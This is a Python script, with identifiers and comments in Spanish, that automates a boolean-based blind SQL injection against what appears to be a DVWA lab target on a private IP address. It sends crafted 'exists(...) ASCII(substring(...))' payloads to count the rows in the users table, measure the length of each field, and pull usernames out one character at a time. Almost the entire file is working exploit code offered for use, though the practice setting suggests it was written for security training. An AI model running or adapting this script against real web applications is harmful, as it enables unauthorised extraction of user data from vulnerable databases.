import requests
import urllib

class Programa():
    
    def __init__(self): 
        # URL para peticiones SQL Blind
        self.url='http://192.168.1.105:1234/vulnerabilities/sqli_blind/'

        self.abecedario_hexadecimal='abcdef0123456789'
        self.abecerario='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    def ejecutarSQL(self, sqli):
        try:
            result = requests.post(
                url=self.url,
                headers={'Content-Type':'application/x-www-form-urlencoded'},
                cookies={'PHPSESSID':'565dh7nf7j7ccup0j8ph1usk34', 'security':'medium'},
                proxies={'http':'http://127.0.0.1:8080/'},
                data={'id': sqli, 'Submit': 'Submit'}
            )
            if result.status_code == 200:
                if 'ID exists' in result.text:
                    return True
                elif 'ID is MISSING' in result.text:
                    return False
                else:
                    print('Algo ha ido mal con tu sql')
                    return False
            else:
                print('URL mal formada... {} con SQLI: {}'.format(result.url, sqli))
                return False
        except Exception as e:
            print('llega qui {}'.format(e))
            return False        

    def cantidadTuplasEnTapla(self, tabla, campo):
        result = 0
        for i in range(1, 100):
            existe = self.ejecutarSQL("0 or {i} = (select count({campo}) from {tabla})".format(i=i, campo=campo, tabla=tabla))
            if existe:
                result = i+1
                break
        return result

    def longitudCampoIDtablaCampo(self, id, tabla, campo, campoConocido):
        for i in range(1, 100):
            existe = self.ejecutarSQL("0 or exists(select {campo} from {tabla} where {campoConocido}={id} and length({campo}) = {i})".format(i=i+1, campo=campo, tabla=tabla, campoConocido=campoConocido, id=id))
            if existe:
                return i+2
        return -1

    def cogerNombreDeTablaPorID(self, user, tabla, id, campoConocido):
        nombre = ''
        cantidad=self.longitudCampoIDtablaCampo(id, tabla, user, campoConocido)
        for j in range(1, cantidad): # Longitud de dicho nombre de user
            for i in range(0, len(self.abecerario)):
                existe = self.ejecutarSQL("0 or exists(select {user} from {tabla} where user_id={id} and ASCII(substring({user}, {j}, 1))={i})".format(user=user, tabla=tabla, id=id, j=j, i=ord(self.abecerario[i])))
                if existe:
                    nombre = '{nombre}{letra}'.format(nombre=nombre, letra=self.abecerario[i])
                    break
        return nombre

    def sacarValorPorTablaColumnaID(self, tabla, columna, nombre_campo_id):
        contador_null = 0
        nombres = []
        cantidad_registros_en_tabla = self.cantidadTuplasEnTapla(tabla, columna)
        if cantidad_registros_en_tabla > 0:
            for k in range(1, cantidad_registros_en_tabla): # Cantidad de tuplas en users
                datos = self.cogerNombreDeTablaPorID(columna, tabla, k, nombre_campo_id)
                if datos:
                    nombres.append(datos)
                else:
                    if contador_null == 1:
                        break
                    contador_null += 1
        else:
            print('No hay registros. \tTabla: {} - Columna: {} - Campo conocido: {}'.format(tabla, columna, nombre_campo_id))
        return nombres

if __name__ == "__main__":
    programa = Programa()
    nombres = programa.sacarValorPorTablaColumnaID(tabla='users', columna='user', nombre_campo_id='user_id')
    print(nombres)